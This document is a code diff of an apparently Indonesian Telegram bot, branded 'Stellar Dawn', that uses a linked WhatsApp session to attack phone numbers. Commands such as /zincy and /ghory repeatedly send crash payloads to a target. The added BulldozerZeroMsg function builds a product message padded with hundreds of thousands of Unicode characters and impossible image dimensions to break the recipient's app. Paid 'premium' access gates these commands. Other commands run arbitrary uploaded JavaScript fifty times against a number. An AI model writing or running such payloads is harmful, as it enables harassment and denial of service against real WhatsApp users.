+            await AxDEnres(sock, target);
+            await sleep(500);
+            await AxDEnres(sock, target);
+            await sleep(500);
+            
+        }
+
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : Succes
+│─ Date   : ${date}
+└─────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: chatId,
+                message_id: sent.message_id,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
+                    ]
+                }
+            }
+        );
+    } catch (err) {
+        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
+    }
+});
 bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -1444,17 +1605,9 @@ bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
     }
 
     const targetNumber = match[1];
-    const randomVideo = getRandomVideo();
+    const randomImage = getRandomImage();
     const date = getCurrentDate();
     const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-
-    // Validasi panjang nomor
-    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
-        return bot.sendMessage(chatId, 
-            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /zincy 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
 
     const target = `${formattedNumber}@s.whatsapp.net`;
 
@@ -1462,9 +1615,9 @@ bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
     const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
 
     if (!isUserPremium) {
-        return bot.sendVideo(chatId, randomVideo, {
+        return bot.sendPhoto(chatId, randomImage, {
             caption: `
-<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
+<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>
 ❌ Akses ditolak. Fitur ini hanya untuk user premium.
 `,
             parse_mode: "HTML",
@@ -1479,17 +1632,15 @@ bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
     if (sessions.size === 0) {
         return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
     }
-
-    const sent = await bot.sendVideo(chatId, randomVideo, {
+const sock = getActiveSock();
+    const sent = await bot.sendPhoto(chatId, randomImage, {
         caption: `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
 │─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Force Attack
 │─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
 │─ Date   : ${date}
-└─────────────────────────┘</blockquote>
+└─────────────────────────┘
  ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
 `,
         parse_mode: "HTML"
@@ -1500,14 +1651,12 @@ bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
 
         await bot.editMessageCaption(
             `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
 │─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Force Attack
 │─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
 │─ Date   : ${date}
-└─────────────────────────┘</blockquote>
+└─────────────────────────┘
  ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
             `,
             {
@@ -1516,30 +1665,27 @@ bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
                 parse_mode: "HTML",
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
+                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                     ]
                 }
             }
         );
 
-        for (let i = 0; i < 20; i++) {
-            await sockFcInvis(sock, target);
+        for (let i = 0; i < 5; i++) {
+            await BulldozerZeroMsg(sock, target);
             await sleep(500);
-            await sockFcInvis(sock, target);
+            await BulldozerZeroMsg(sock, target);
+            await sleep(500);
         }
-
-        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Force`));
 
         await bot.editMessageCaption(
             `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
 │─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Force Attack
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : Succes
 │─ Date   : ${date}
-└─────────────────────────┘</blockquote>
+└─────────────────────────┘
  ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
             `,
             {
@@ -1548,7 +1694,117 @@ bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
                 parse_mode: "HTML",
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
+                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
+                    ]
+                }
+            }
+        );
+    } catch (err) {
+        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
+    }
+});
+bot.onText(/\/ghory(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    // Validasi format
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, 
+            `❌ *Format salah!*\n\nGunakan: /zincy [nomor]\nContoh: /zincy 6281234567890`,
+            { parse_mode: "Markdown" }
+        );
+    }
+
+    const targetNumber = match[1];
+    const randomImage = getRandomImage();
+    const date = getCurrentDate();
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+    const target = `${formattedNumber}@s.whatsapp.net`;
+
+    // Periksa status premium user
+    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
+
+    if (!isUserPremium) {
+        return bot.sendPhoto(chatId, randomImage, {
+            caption: `
+<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>
+❌ Akses ditolak. Fitur ini hanya untuk user premium.
+`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
+                ]
+            }
+        });
+    }
+
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
+    }
+const sock = getActiveSock();
+    const sent = await bot.sendPhoto(chatId, randomImage, {
+        caption: `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${date}
+└─────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+`,
+        parse_mode: "HTML"
+    });
+
+    try {
+        await sleep(1000);
+
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${date}
+└─────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: chatId,
+                message_id: sent.message_id,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
+                    ]
+                }
+            }
+        );
+
+        for (let i = 0; i < 5; i++) {
+            await RxVzBurstV2(sock, target);
+            await sleep(500);
+            await RxVzBurstV2(sock, target);
+            await sleep(500);
+        }
+
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : Succes
+│─ Date   : ${date}
+└─────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: chatId,
+                message_id: sent.message_id,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                     ]
                 }
             }
@@ -1559,7 +1815,208 @@ bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
 });
 
 
+//// TEST FUNC
+/// Map untuk menyimpan fungsi yang diupload per user (key: userId)
+const userFunctions = new Map();
 
+// Command: /uploadfunc (harus reply ke file .js)
+bot.onText(/\/uploadfunc/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    // Validasi: harus reply ke dokumen
+    if (!msg.reply_to_message || !msg.reply_to_message.document) {
+        return bot.sendMessage(chatId, '❌ Balas ke file .js dengan perintah /uploadfunc');
+    }
+
+    const doc = msg.reply_to_message.document;
+    if (!doc.file_name.endsWith('.js')) {
+        return bot.sendMessage(chatId, '❌ Hanya file .js yang diperbolehkan');
+    }
+
+    try {
+        // Dapatkan link file dan baca isinya
+        const fileLink = await bot.getFileLink(doc.file_id);
+        const response = await axios.get(fileLink);
+        const code = response.data;
+
+        // Simpan kode dengan status belum digunakan
+        userFunctions.set(userId, { code, used: false });
+
+        bot.sendMessage(chatId, '✅ Fungsi berhasil diupload! Sekarang kamu bisa menggunakan /testfunction sekali.');
+    } catch (err) {
+        bot.sendMessage(chatId, `❌ Gagal membaca file: ${err.message}`);
+    }
+});
+
+// Command: /testfunction [nomor]
+bot.onText(/\/testfunction(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    // Validasi nomor target
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, '❌ Gunakan: /testfunction [nomor]\nContoh: /testfunction 6281234567890');
+    }
+
+    const targetNumber = match[1];
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, '');
+    
+    // Validasi panjang nomor
+    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
+        return bot.sendMessage(chatId, '❌ Nomor tidak valid. Pastikan 10-15 digit (termasuk kode negara).');
+    }
+
+    // Cek apakah user memiliki fungsi yang diupload dan belum dipakai
+    const userFunc = userFunctions.get(userId);
+    if (!userFunc || userFunc.used) {
+        return bot.sendMessage(chatId, '❌ Kamu belum mengupload fungsi atau sudah digunakan. Upload ulang dengan /uploadfunc');
+    }
+
+    // Cek koneksi WhatsApp
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, '⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.');
+    }
+
+    const target = `${formattedNumber}@s.whatsapp.net`;
+    
+    // Kirim status sedang diproses
+    const sent = await bot.sendMessage(chatId, `🔄 Memproses fungsi ke target ${formattedNumber} (50x loop)...`);
+
+    try {
+        // Buat fungsi dari kode yang diupload
+        const fn = new Function('sock', 'target', 'console', userFunc.code);
+
+        // Loop 50 kali
+        let successCount = 0;
+        let errorCount = 0;
+        
+        for (let i = 0; i < 50; i++) {
+            try {
+                // Update status setiap 10 iterasi
+                if (i % 10 === 0 && i > 0) {
+                    await bot.editMessageText(
+                        `🔄 Progress: ${i}/50 loop selesai... (Sukses: ${successCount}, Gagal: ${errorCount})`,
+                        { chat_id: chatId, message_id: sent.message_id }
+                    );
+                }
+                
+                // Jalankan fungsi
+                await fn(sock, target, console);
+                successCount++;
+                
+                // Delay kecil agar tidak overload
+                await sleep(500); // 500ms delay antar eksekusi
+                
+            } catch (err) {
+                errorCount++;
+                console.error(`Error pada loop ke-${i + 1}:`, err.message);
+            }
+        }
+
+        // Hapus data fungsi setelah digunakan (one-time use)
+        userFunctions.delete(userId);
+
+        // Kirim hasil akhir
+        await bot.editMessageText(
+            `✅ Fungsi selesai dijalankan!\n\n` +
+            `📊 Hasil:\n` +
+            `• Total loop: 50\n` +
+            `• Sukses: ${successCount}\n` +
+            `• Gagal: ${errorCount}\n` +
+            `• Target: ${formattedNumber}`,
+            { 
+                chat_id: chatId, 
+                message_id: sent.message_id,
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "📱 Buka WhatsApp", url: `https://wa.me/${formattedNumber}` }]
+                    ]
+                }
+            }
+        );
+
+    } catch (err) {
+        await bot.editMessageText(
+            `❌ Gagal menjalankan fungsi: ${err.message}`,
+            { chat_id: chatId, message_id: sent.message_id }
+        );
+        // Jika error, tetap tandai sebagai used agar tidak bisa dipakai lagi
+        userFunctions.delete(userId);
+    }
+});
+
+// Versi dengan parameter tambahan jika fungsi butuh akses ke bot atau chatId
+// Command: /testfunction2 [nomor]
+bot.onText(/\/testfunction2(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, '❌ Gunakan: /testfunction2 [nomor]');
+    }
+
+    const targetNumber = match[1];
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, '');
+    
+    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
+        return bot.sendMessage(chatId, '❌ Nomor tidak valid.');
+    }
+
+    const userFunc = userFunctions.get(userId);
+    if (!userFunc || userFunc.used) {
+        return bot.sendMessage(chatId, '❌ Kamu belum mengupload fungsi atau sudah digunakan.');
+    }
+
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, '⚠️ WhatsApp belum terhubung.');
+    }
+
+    const target = `${formattedNumber}@s.whatsapp.net`;
+    
+    const sent = await bot.sendMessage(chatId, `🔄 Memproses dengan parameter lengkap...`);
+
+    try {
+        // Buat fungsi dengan parameter lebih lengkap
+        const fn = new Function('sock', 'target', 'bot', 'chatId', 'msg', 'console', userFunc.code);
+
+        // Loop 50 kali
+        for (let i = 0; i < 50; i++) {
+            await fn(sock, target, bot, chatId, msg, console);
+            await sleep(300); // Delay 300ms
+            
+            // Update progress setiap 10 loop
+            if ((i + 1) % 10 === 0) {
+                await bot.editMessageText(
+                    `🔄 Progress: ${i + 1}/50 loop selesai...`,
+                    { chat_id: chatId, message_id: sent.message_id }
+                );
+            }
+        }
+
+        userFunctions.delete(userId);
+
+        await bot.editMessageText(
+            `✅ 50x loop selesai untuk target ${formattedNumber}`,
+            { 
+                chat_id: chatId, 
+                message_id: sent.message_id,
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "📱 Buka WhatsApp", url: `https://wa.me/${formattedNumber}` }]
+                    ]
+                }
+            }
+        );
+
+    } catch (err) {
+        await bot.editMessageText(
+            `❌ Error: ${err.message}`,
+            { chat_id: chatId, message_id: sent.message_id }
+        );
+        userFunctions.delete(userId);
+    }
+});
 ///////// ( CONTROL ) \\\\\\\\\\\\\\\
 bot.onText(/^\/reloadcore$/, async (msg) => {
     pullUpdate(bot, msg);
@@ -1660,7 +2117,7 @@ Anda tidak memiliki izin untuk menjalankan perintah ini.`, { parse_mode: "Markdo
         return bot.sendMessage(chatId, `
 ( ❌ ) *Perintah Salah!*
 Gunakan format berikut:
-✅ /addprem <code>6843967527 30d</code>
+✅ /addprem <pre>6843967527 30d</pre>
 `, { parse_mode: "HTML" });
     }
 
@@ -1669,7 +2126,7 @@ Gunakan format berikut:
         return bot.sendMessage(chatId, `
 ( ❌ ) *Perintah Salah!*
 Gunakan format:
-✅ /addprem <code>6843967527 30d</code>
+✅ /addprem <pre>6843967527 30d</pre>
 `, { parse_mode: "HTML" });
     }
 
@@ -1863,6 +2320,222 @@ bot.onText(/\/delceo(?:\s(\d+))?/, (msg, match) => {
     }
 });
 
+// Command /addgroup - Hanya bisa digunakan di dalam grup
+bot.onText(/^\/addgroup$/, async (msg) => {
+    const chatId = msg.chat.id;
+    const senderId = msg.from.id;
+    
+    // Cek apakah command dijalankan di grup
+    if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') {
+        return bot.sendMessage(chatId, `
+❌ *Perintah ini hanya bisa digunakan di dalam grup!*
+Silakan tambahkan bot ke grup dan jalankan perintah di sana.
+`, { parse_mode: "Markdown" });
+    }
+
+    // Cek akses (hanya owner dan ceo)
+    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
+        return bot.sendMessage(chatId, `
+( ⚠️ ) *Akses Ditolak!*
+Anda tidak memiliki izin untuk menjalankan perintah ini.
+Hanya *Owner/CEO* yang dapat menambahkan grup premium.
+`, { parse_mode: "Markdown" });
+    }
+
+    // Cek apakah grup sudah premium
+    if (premiumGroups.includes(chatId)) {
+        return bot.sendMessage(chatId, `
+✅ *Grup ini sudah terdaftar sebagai grup premium!*
+Tidak perlu menambahkan lagi.
+`, { parse_mode: "Markdown" });
+    }
+
+    try {
+        // Dapatkan info grup
+        const chat = await bot.getChat(chatId);
+        const groupName = chat.title || "Unknown Group";
+        const groupLink = chat.inviteLink || "Tidak ada link";
+        const memberCount = await bot.getChatMembersCount(chatId);
+
+        // Tambahkan grup ke database premium
+        premiumGroups.push(chatId);
+        savePremiumGroups();
+
+        // Kirim notifikasi sukses ke grup
+        await bot.sendMessage(chatId, `
+✅ *BERHASIL MENAMBAHKAN GRUP PREMIUM!*
+
+📊 *Informasi Grup:*
+• Nama Grup : ${groupName}
+• ID Grup : \`${chatId}\`
+• Total Member : ${memberCount} orang
+• Status : ✅ PREMIUM (Permanen)
+• Ditambahkan oleh : ${msg.from.first_name || 'Admin'} (@${msg.from.username || 'no username'})
+
+🎉 *Fitur premium sekarang aktif untuk grup ini!*
+Terima kasih telah mendukung kami.
+`, { parse_mode: "Markdown" });
+
+        // Kirim notifikasi ke owner (opsional)
+        const ownerId = config.OWNER_ID[0]; // Ambil owner pertama
+        if (ownerId) {
+            await bot.sendMessage(ownerId, `
+🔔 *NOTIFIKASI GRUP PREMIUM BARU*
+
+• Nama Grup : ${groupName}
+• ID Grup : \`${chatId}\`
+• Total Member : ${memberCount}
+• Ditambahkan oleh : ${msg.from.first_name} (ID: ${senderId})
+• Link Grup : ${groupLink}
+
+⏰ Waktu: ${moment().format('YYYY-MM-DD HH:mm:ss')}
+`, { parse_mode: "Markdown" });
+        }
+
+        console.log(chalk.green(`[GROUPPREM] ${senderId} menambahkan grup ${chatId} (${groupName})`));
+
+    } catch (error) {
+        console.error("Error adding premium group:", error);
+        bot.sendMessage(chatId, `
+❌ *Gagal menambahkan grup premium!*
+Error: ${error.message}
+
+Silakan coba lagi atau hubungi owner.
+`, { parse_mode: "Markdown" });
+    }
+});
+
+// --- ( case list grup premium ) ---
+bot.onText(/\/listgroup/, async (msg) => {
+    const chatId = msg.chat.id;
+    const senderId = msg.from.id;
+
+    // Cek akses (hanya owner dan ceo)
+    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
+        return bot.sendMessage(chatId, `
+❌ *Akses ditolak!*
+Hanya *Owner/CEO* yang dapat melihat daftar grup premium.
+`, { parse_mode: "Markdown" });
+    }
+
+    if (premiumGroups.length === 0) {
+        return bot.sendMessage(chatId, "📌 Belum ada grup premium yang terdaftar.");
+    }
+
+    let message = "```\n";
+    message += "📋 DAFTAR GRUP PREMIUM\n";
+    message += "══════════════════════\n\n";
+
+    // Tampilkan 10 grup pertama (batasi untuk menghindari pesan terlalu panjang)
+    const displayGroups = premiumGroups.slice(0, 10);
+    
+    for (let i = 0; i < displayGroups.length; i++) {
+        const groupId = displayGroups[i];
+        try {
+            // Coba dapatkan info grup
+            const chat = await bot.getChat(groupId);
+            const groupName = chat.title || "Unknown";
+            message += `${i + 1}. ${groupName}\n`;
+            message += `   ID: ${groupId}\n`;
+            message += `   Member: ${await bot.getChatMembersCount(groupId)} orang\n\n`;
+        } catch (error) {
+            // Jika gagal dapat info, tampilkan ID saja
+            message += `${i + 1}. Grup tidak dapat diakses\n`;
+            message += `   ID: ${groupId}\n\n`;
+        }
+    }
+
+    if (premiumGroups.length > 10) {
+        message += `...dan ${premiumGroups.length - 10} grup lainnya\n`;
+    }
+
+    message += `\nTotal: ${premiumGroups.length} grup premium\n`;
+    message += "```";
+
+    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
+});
+
+// --- ( case hapus grup premium ) ---
+bot.onText(/\/delgroup(?:\s(.+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const senderId = msg.from.id;
+
+    // Cek akses (hanya owner dan ceo)
+    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
+        return bot.sendMessage(chatId, `
+❌ *Akses ditolak!*
+Hanya *Owner/CEO* yang dapat menghapus grup premium.
+`, { parse_mode: "Markdown" });
+    }
+
+    let targetGroupId;
+
+    // Jika dijalankan di dalam grup dan tanpa parameter
+    if ((msg.chat.type === 'group' || msg.chat.type === 'supergroup') && (!match || !match[1])) {
+        targetGroupId = chatId;
+    } 
+    // Jika ada parameter ID grup
+    else if (match && match[1]) {
+        targetGroupId = match[1].trim();
+    } 
+    // Jika tidak valid
+    else {
+        return bot.sendMessage(chatId, `
+❌ *Perintah Salah!*
+Gunakan format:
+✅ /delgroup (untuk hapus grup saat ini)
+✅ /delgroup -1001234567890 (untuk hapus grup dengan ID tertentu)
+
+*Catatan:* Perintah ini hanya bisa digunakan owner/CEO.
+`, { parse_mode: "Markdown" });
+    }
+
+    // Validasi format ID grup
+    if (!targetGroupId.startsWith('-100')) {
+        return bot.sendMessage(chatId, `
+❌ *ID Grup Tidak Valid!*
+ID grup harus diawali dengan -100.
+Contoh: -1001234567890
+`, { parse_mode: "Markdown" });
+    }
+
+    // Cek apakah grup ada di database
+    const index = premiumGroups.indexOf(targetGroupId);
+    if (index === -1) {
+        return bot.sendMessage(chatId, `❌ Grup dengan ID \`${targetGroupId}\` tidak ditemukan di daftar premium.`, { parse_mode: "Markdown" });
+    }
+
+    try {
+        // Hapus dari database
+        premiumGroups.splice(index, 1);
+        savePremiumGroups();
+
+        let responseMessage = `
+✅ *Berhasil menghapus grup premium!*
+ID Grup: \`${targetGroupId}\`
+`;
+
+        // Jika grup masih bisa diakses, coba dapatkan nama
+        try {
+            const chat = await bot.getChat(targetGroupId);
+            responseMessage = `
+✅ *Berhasil menghapus grup premium!*
+Nama Grup: ${chat.title}
+ID Grup: \`${targetGroupId}\`
+`;
+        } catch (e) {
+            // Abaikan jika tidak bisa akses
+        }
+
+        bot.sendMessage(chatId, responseMessage, { parse_mode: "Markdown" });
+        console.log(chalk.yellow(`[GROUPPREM] ${senderId} menghapus grup ${targetGroupId}`));
+
+    } catch (error) {
+        console.error("Error deleting premium group:", error);
+        bot.sendMessage(chatId, `❌ Gagal menghapus grup: ${error.message}`);
+    }
+});
+
 // Case about me
 bot.onText(/\/aboutme/, async (msg) => {
     try {
@@ -1898,735 +2571,515 @@ bot.onText(/\/aboutme/, async (msg) => {
         bot.sendMessage(msg.chat.id, "❌ Error showing info");
     }
 });
+////FUNC 
+async function BulldozerZeroMsg(sock, target) {
+  const zepUnicode = "ꦾ".repeat(25000) + "ꦽ".repeat(25000) + "\u2080".repeat(175000);
+  
+  const productImage = {
+    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQPIYikiwi3m6cnqci3YWcDdEXK4pRdEoVuffum6NfmIgZS-w1l3p8hAUz650_FFQNJa0iCUOIRAEXUEi3_lrzuZXctdJEyYxC2eS0afzg?ccb=9-4&oh=01_Q5Aa3QGSiEmJ9tDlRgHnGNJx3KCFYCdyhmkeaq3eHDd1YLRxtw&oe=69631B8B&_nc_sid=e6ed6c&mms3=true",
+    mimetype: "image/jpeg",
+    fileSha256: Buffer.from("T+i083KjdABcBnJBzbB8paMZoMyNxT3rc+8FUOb4Qtg=", "base64"),
+    fileLength: "38617",
+    height: 128000000,
+    width: 7200000000,
+    mediaKey: Buffer.from("zi+b43DCleFrEbpS7EOYN1eKcRykOKDmUmDj3ISXvZI=", "base64"),
+    fileEncSha256: Buffer.from("54hPlvNm6Nk1roPnpQGvfvCu8JYb4wLalZ0FZay7Src=", "base64"),
+    directPath: "/o1/v/t24/f2/m237/AQPIYikiwi3m6cnqci3YWcDdEXK4pRdEoVuffum6NfmIgZS-w1l3p8hAUz650_FFQNJa0iCUOIRAEXUEi3_lrzuZXctdJEyYxC2eS0afzg?ccb=9-4&oh=01_Q5Aa3QGSiEmJ9tDlRgHnGNJx3KCFYCdyhmkeaq3eHDd1YLRxtw&oe=69631B8B&_nc_sid=e6ed6c",
+    mediaKeyTimestamp: "1765450399",
+    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD", "base64")
+  };
 
-////////( PLUGIN TOOLS ) ///////
-// ======================
-// /ai – tanya AI
-// ======================
-bot.onText(/^\/ai(?:\s+(.+))?/, async (msg, match) => {
-    const chatId = msg.chat.id
-    const teks = match[1]
-    if (!teks) return bot.sendMessage(chatId, "isi teks dulu dong, contoh: /ai halo")
+  const product = {
+    productImage: productImage,
+    productId: "253813391248495300",
+    title: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + zepUnicode,
+    currencyCode: "USD",
+    priceAmount1000: "0",
+    productImageCount: 1000000
+  };
 
-    bot.sendChatAction(chatId, "typing")
+  const deviceListMetadata = {
+    recipientKeyHash: "iGDumWoqJtlqxw==",
+    recipientTimestamp: "1765411475"
+  };
 
-    try {
-        const url = "https://api.deline.web.id/ai/copilot?apikey=agasndul&text=" + encodeURIComponent(teks)
-        const res = await fetch(url)
-        const data = await res.json()
+  const messageContextInfo = {
+    deviceListMetadata: deviceListMetadata,
+    deviceListMetadataVersion: 2,
+    messageSecret: "WP/LUg2LGEOMfWhJuSzNtPrDi+L1RjGRiYo+45drhMc="
+  };
 
-        if (!data.status) return bot.sendMessage(chatId, "AI error:\n" + (data.message || "unknown"))
+  const zieeMsg = generateWAMessageFromContent(
+    "status@broadcast",
+    {
+      productMessage: {
+        product: product,
+        businessOwnerJid: "225752674992330@lid"
+      },
+      messageContextInfo: messageContextInfo
+    },
+    {}
+  );
 
-        // bersihin simbol aneh
-        const jawaban = data.result.replace(/[#_*`~]/g, "").replace(/\n{3,}/g, "\n\n").trim()
-        bot.sendMessage(chatId, jawaban)
-    } catch (e) {
-        bot.sendMessage(chatId, "AI lagi lambat, coba lagi nanti")
-    }
-})
-
-/* =====================
-   /panel
-===================== */
-bot.onText(/^\/panel$/, async (msg) => {
-  const chatId = msg.chat.id
-  try {
-    const hostname = os.hostname()
-    const cpuModel = os.cpus()[0].model
-    const cpuCore = os.cpus().length
-    const totalMem = Math.round(os.totalmem() / 1024 / 1024)
-    const platform = os.platform()
-    const arch = os.arch()
-    const uptimeOs = Math.floor(os.uptime() / 3600)
-
-    const now = new Date().toLocaleString("id-ID", {
-      timeZone: "Asia/Jakarta"
-    })
-
-    const ip = (await axios.get("https://api.ipify.org?format=json")).data.ip
-
-    const text = `
-💻 <blockquote><b>PANEL INFORMATION</b></blockquote>
-━━━━━━━━━━━━━━━━━━
-🖥️ <b>Hostname:</b> ${hostname}
-🧠 <b>CPU:</b> ${cpuModel} (${cpuCore} core)
-💾 <b>Total RAM:</b> ${totalMem} mb
-⚙️ <b>OS:</b> ${platform.toUpperCase()} (${arch})
-📡 <b>Public IP:</b> ${ip}
-⏱️ <b>Uptime Server:</b> ${uptimeOs} jam
-📅 <b>Waktu:</b> ${now}
-━━━━━━━━━━━━━━━━━━
-<blockquote>data real-time dari panel host kamu</blockquote>
-`
-    bot.sendMessage(chatId, text, { parse_mode: "HTML" })
-  } catch {
-    bot.sendMessage(chatId, "panel error. server lu lagi manyun.")
-  }
-})
-
-/* =====================
-   /waifu
-===================== */
-bot.onText(/^\/waifu$/, async (msg) => {
-  const chatId = msg.chat.id
-  try {
-    const { data } = await axios.get("https://api.nvidiabotz.xyz/random/waifu")
-    bot.sendPhoto(chatId, data.result)
-  } catch {
-    bot.sendMessage(chatId, "waifu ngumpet. coba lagi.")
-  }
-})
-
-/* =====================
-   /github <username>
-===================== */
-bot.onText(/^\/github\s+(.+)/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const user = match[1]
-  try {
-    const { data } = await axios.get(
